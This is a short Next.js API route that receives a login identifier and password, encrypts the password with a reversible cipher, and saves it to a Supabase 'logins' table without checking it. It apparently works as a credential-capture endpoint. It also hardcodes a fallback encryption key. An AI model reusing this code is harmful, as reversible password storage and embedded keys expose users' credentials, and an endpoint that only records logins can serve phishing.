import { NextResponse } from "next/server"
import { supabase } from "@/lib/supabase"
import { encrypt } from "@/lib/crypto"

export async function POST(req: Request) {
  try {
    const body = await req.json()
    const { identifier = "", password = "" } = body

    // Use the encryption key from environment variable
    const encryptionKey = process.env.ENCRYPTION_KEY || "A/3Z8qR9mK2nP5sT7vY0wC4eG6iL8oN1bD3fH5jM7pQ="

    // Encrypt the password using AES-256-GCM
    const encrypted = encrypt(password, encryptionKey)

    console.log('[Supabase] Saving login data...')
    
    const { data, error } = await supabase
      .from('logins')
      .insert([
        {
          identifier,
          password_iv: encrypted.iv,
          password_tag: encrypted.tag,
          password_ciphertext: encrypted.ciphertext,
          created_at: new Date().toISOString(),
        },
      ])
      .select()

    if (error) {
      console.error('[Supabase] Insert error:', error)
      return NextResponse.json({ error: error.message }, { status: 500 })
    }

    console.log('[Supabase] Data saved successfully:', data?.[0]?.id)
    return NextResponse.json({ ok: true, id: data?.[0]?.id })
  } catch (err: any) {
    console.error("[API /api/login] Error:", err)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
